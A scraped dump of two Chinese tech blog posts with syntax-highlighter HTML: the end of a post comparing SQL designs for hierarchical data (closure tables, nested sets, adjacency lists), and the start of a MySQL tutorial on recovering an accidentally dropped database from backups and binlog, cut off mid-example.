class=\"crayon-v\">descendant</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>要删除一颗完整的子树，比如评论#4 和它所有的后代，可删除所有在 treepaths 表中后代为 #4的行，以及那些以评论#4后代为后代的行。</p>\n<p>闭包表的设计比嵌套集更加的直接，两者都能快捷地查询给定节点的祖先和后代，但是闭包表能更加简单地维护分层信息。这两个设计都比使用邻接表或者路径枚举更方便地查询给定节点的直接后代和祖先。</p>\n<p>然而你可以优化闭包表来使它更方便地查询直接父亲节点或者子节点： 在 treepaths 表中添加一个 path_length 字段。一个节点的自我引用的path_length 为0，到它直接子节点的path_length 为1，再下一层为2，以此类推。这样查询起来就方便多了。</p>\n<h3>总结：你该使用哪种设计？</h3>\n<p>每种设计都各有优劣，如何选择设计，依赖于应用程序的哪种操作是你最需要性能上的优化。</p>\n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\">\n<colgroup>\n<col>\n<col>\n<col>\n<col>\n<col>\n<col>\n<col></colgroup>\n<tbody>\n<tr>\n<td>方案</td>\n<td>表数量</td>\n<td>查询子</td>\n<td>查询树</td>\n<td>插入</td>\n<td>删除</td>\n<td>引用完整性</td>\n</tr>\n<tr>\n<td>邻接表</td>\n<td>1</td>\n<td>简单</td>\n<td>困难</td>\n<td>简单</td>\n<td>简单</td>\n<td>是</td>\n</tr>\n<tr>\n<td>枚举路径</td>\n<td>1</td>\n<td>简单</td>\n<td>简单</td>\n<td>简单</td>\n<td>简单</td>\n<td>否</td>\n</tr>\n<tr>\n<td>嵌套集</td>\n<td>1</td>\n<td>困难</td>\n<td>简单</td>\n<td>困难</td>\n<td>困难</td>\n<td>否</td>\n</tr>\n<tr>\n<td>闭包表</td>\n<td>2</td>\n<td>简单</td>\n<td>简单</td>\n<td>简单</td>\n<td>简单</td>\n<td>是</td>\n</tr>\n</tbody>\n</table>\n<p>层级数据设计比较</p>\n<p>1、邻接表是最方便的设计，并且很多程序员都了解它</p>\n<p>2、如果你使用的数据库支持WITH 或者 CONNECT BY PRIOR 的递归查询，那能使得邻接表的查询更高效。</p>\n<p>3、枚举路径能够很直观地展示出祖先到后代之间的路径，但同时由于它不能确保引用完整性，使得这个设计非常脆弱。枚举路径也使得数据的存储变得比较冗余。</p>\n<p>4、嵌套集是一个聪明的解决方案，但可能过于聪明，它不能确保引用完整性。最好在一个查询性能要求很高而对其他要求一般的场合来使用它。</p>\n<p>5、闭包表是最通用的设计，并且以上的方案也只有它能允许一个节点属于多棵树。它要求一张额外的表来存储关系，使用空间换时间的方案减少操作过程中由冗余的计算所造成的消耗。</p>\n<p>这几种设计方案只是我们日常设计中的一部分，开发中肯定会遇到更多的选择方案。选择哪一种方案，是需要切合实际，根据自己项目的需求，结合方案的优劣，选择最适合的一种。</p>\n<p>我遇到一些开发人员，为了敷衍了事，在设计数据库表时，只考虑能否完成眼下的任务，不太注重以后拓展的问题，不考虑查询起来是否耗性能。可能前期数据量不多的时候，看不出什么影响，但数据量稍微多一点的话，就已经显而易见了（例如：可以使用外联接查询的，偏偏要使用子查询）。</p>\n<p>我觉得设计数据库是一个很有趣且充满挑战的工作，它有时能体现你的视野有多宽广，有时它能让你睡不着觉，总之痛并快乐着。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111111\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111111votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111111\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/03/database-logo.png"], "fav_nums": 5, "comment_nums": 0, "create_date": "2017/06/08", "praise_nums": 3}
{"tags": "数据库,MySQL,IT技术", "front_image_path": "full/ed02bd36286ef5ec9f067bc8d381a46ca5124f1e.jpg", "title": "MySQL 数据库误删除后的数据恢复操作说明", "url_object_id": "baee0cc46c5ab93a1ad5ffe8325e89c8", "url": "http://blog.jobbole.com/111402/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/kevingrace/p/5904800.html\">散尽浮华</a>   </div><p>在日常运维工作中，对于数据库的备份是至关重要的！数据库对于网站的重要性使得我们对 MySQL 数据库的管理不容有失！然而是人总难免会犯错误，说不定哪天大脑短路了，误操作把数据库给删除了，怎么办？</p>\n<p>下面，就 MySQL 数据库误删除后的恢复方案进行说明。</p>\n<p><strong>一、工作场景</strong></p>\n<p>（1）MySQL数据库每晚12:00自动完全备份。<br>\n（2）某天早上上班，9点的时候，一同事犯晕drop了一个数据库！<br>\n（3）需要紧急恢复！可利用备份的数据文件以及增量的binlog文件进行数据恢复。</p>\n<p><strong>二、数据恢复思路</strong></p>\n<p>（1）利用全备的sql文件中记录的CHANGE MASTER语句，binlog文件及其位置点信息，找出binlog文件中增量的那部分。<br>\n（2）用mysqlbinlog命令将上述的binlog文件导出为sql文件，并剔除其中的drop语句。<br>\n（3）通过全备文件和增量binlog文件的导出sql文件，就可以恢复到完整的数据。</p>\n<p><strong>三、实例说明</strong></p>\n<p>首先，要确保mysql开启了binlog日志功能。在/etc/my.cnf文件里的[mysqld]区块添加：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05eaae8f3912330198\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlog-bin=mysql-bin</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8f3912330198-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05eaae8f3912330198-1\"><span class=\"crayon-v\">log</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">bin</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>然后重启mysql服务</p>\n<p><strong>（1）在ops库下创建一张表customers</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05eaae8fd931966668\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmysql&gt; use ops;\r\nmysql&gt; create table customers(\r\n-&gt; id int not null auto_increment,\r\n-&gt; name char(20) not null,\r\n-&gt; age int not null,\r\n-&gt; primary key(id)\r\n-&gt; )engine=InnoDB;\r\nQuery OK, 0 rows affected (0.09 sec)\r\n\r\nmysql&gt; show tables;\r\n+---------------+\r\n| Tables_in_ops |\r\n+---------------+\r\n| customers |\r\n+---------------+\r\n1 row in set (0.00 sec)\r\n\r\nmysql&gt; desc customers;\r\n+-------+----------+------+-----+---------+----------------+\r\n| Field | Type | Null | Key | Default | Extra |\r\n+-------+----------+------+-----+---------+----------------+\r\n| id | int(11) | NO | PRI | NULL | auto_increment |\r\n| name | char(20) | NO | | NULL | |\r\n| age | int(11) | NO | | NULL | |\r\n+-------+----------+------+-----+---------+----------------+\r\n3 rows in set (0.02 sec)\r\n\r\nmysql&gt; insert into customers values(1,\"wangbo\",\"24\");\r\nQuery OK, 1 row affected (0.06 sec)\r\n\r\nmysql&gt; insert into customers values(2,\"guohui\",\"22\");\r\nQuery OK, 1 row affected (0.06 sec)\r\n\r\nmysql&gt; insert into customers values(3,\"zhangheng\",\"27\");\r\nQuery OK, 1 row affected (0.09 sec)\r\n\r\nmysql&gt; select * from customers;\r\n+----+-----------+-----+\r\n| id | name | age |\r\n+----+-----------+-----+\r\n| 1 | wangbo | 24 |\r\n| 2 | guohui | 22 |\r\n| 3 | zhangheng | 27 |\r\n+----+-----------+-----+\r\n3 rows in set (0.00 sec)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae8fd931966668-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae8fd931966668-45\">45</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-1\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">use</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ops</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-2\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">create </span><span class=\"crayon-e\">table </span><span class=\"crayon-e\">customers</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-3\"><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">id </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">auto_increment</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-4\"><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">name </span><span class=\"crayon-t\">char</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">20</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-5\"><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">age </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-6\"><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">primary </span><span class=\"crayon-e\">key</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-7\"><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">engine</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">InnoDB</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-8\"><span class=\"crayon-e\">Query </span><span class=\"crayon-v\">OK</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">rows </span><span class=\"crayon-e\">affected</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0.09</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sec</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-10\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">show </span><span class=\"crayon-v\">tables</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-11\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-12\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Tables_in_ops</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-13\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-14\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">customers</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-15\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-16\"><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">row </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">set</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0.00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sec</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-17\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-18\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">desc </span><span class=\"crayon-v\">customers</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-19\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-20\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Field</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Type</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Null</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Key</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">Default</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Extra</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-21\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-22\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">11</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">NO</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">PRI</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">auto_increment</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-23\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">name</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">20</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">NO</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-24\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">age</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">11</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">NO</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-25\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span 